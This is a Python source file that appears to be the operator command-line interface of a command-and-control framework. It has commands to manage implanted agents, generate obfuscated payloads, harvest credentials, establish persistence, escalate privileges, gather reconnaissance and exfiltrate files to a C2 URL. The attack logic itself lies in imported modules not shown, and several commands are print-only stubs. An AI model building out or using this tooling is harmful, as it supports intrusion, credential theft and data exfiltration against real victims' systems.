######################################################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

import typer
from modules import credential_harvesting, persistence, privilege_escalation, reconnaissance, exfiltration

cli = typer.Typer()

@cli.command()
def list_agents():
    """List all registered agents."""
    typer.echo("Listing agents...")

@cli.command()
def send_command(agent_id: str, command: str):
    """Send a command to a specific agent."""
    typer.echo(f"Sending command to agent {agent_id}...")

@cli.command()
def generate_payload(platform: str):
    """Generate an obfuscated payload for a specific platform."""
    typer.echo(f"Generating payload for {platform}...")

@cli.command()
def harvest_credentials():
    credentials = credential_harvesting.harvest_credentials()
    typer.echo("Credentials harvested:")
    for cred in credentials:
        typer.echo(cred)

@cli.command()
def establish_persistence():
    persistence.establish_persistence()
    typer.echo("Persistence established.")

@cli.command()
def escalate_privileges():
    privilege_escalation.escalate_privileges()
    typer.echo("Privilege escalation attempted.")

@cli.command()
def gather_system_info():
    system_info = reconnaissance.gather_system_info()
    typer.echo("System Information:")
    typer.echo(system_info)

@cli.command()
def exfiltrate_data(file_path: str, c2_url: str):
    status_code = exfiltration.exfiltrate_data(file_path, c2_url)
    typer.echo(f"Data exfiltration status: {status_code}")

if __name__ == "__main__":
    cli()
